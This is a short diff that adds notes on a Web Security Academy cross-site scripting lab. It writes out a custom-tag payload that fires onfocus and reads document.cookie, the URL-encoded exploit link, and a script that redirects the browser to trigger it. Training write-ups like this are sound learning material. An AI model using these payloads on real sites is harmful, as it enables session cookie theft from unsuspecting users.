@@ -1,0 +1,12 @@
+Seeing the homepage the first thought is to inject through the search bar
+<xss id=x tabindex=1 onfocus=alert(document.cookie)>
+in the search bar gave no error 
+The url was as follows
+https://ac461fb61ff9ac9d809f471a0008002a.web-security-academy.net/?search=%3Cxss+id%3Dx+tabindex%3D1+onfocus%3Dalert(1)%3E%3C%2Fxss%3E
+A #x added to the end of the url implied that the focus was to be on the new element with id=x which we created
+<script>
+location='https://ac461fb61ff9ac9d809f471a0008002a.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'
+</script> 
+
+Important to note in the cheat sheet this was not working on firefox and worked on chrome instead
+location is window.location it changes the url of the current page being displayed
